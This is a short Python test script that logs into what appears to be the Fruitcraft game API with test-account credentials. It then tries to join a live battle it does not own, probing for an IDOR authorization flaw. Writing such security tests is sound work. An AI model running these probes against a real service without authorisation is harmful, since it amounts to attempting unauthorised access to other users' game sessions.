import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    print("Testing Live Battle IDOR...")
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    if not s1: return
    
    print("\n[+] Testing join live battle that doesnt belong to us")
    res = c1.post("/live-battle/livebattlejoin", {"battle_id": 999999})
    if res and res.get("status"):
        print("Joined Live Battle:", res)
    elif res and res.get("raw_html"):
        print("Crashed HTML")
    else:
        print("Join rejected:", res)

if __name__ == "__main__":
    main()
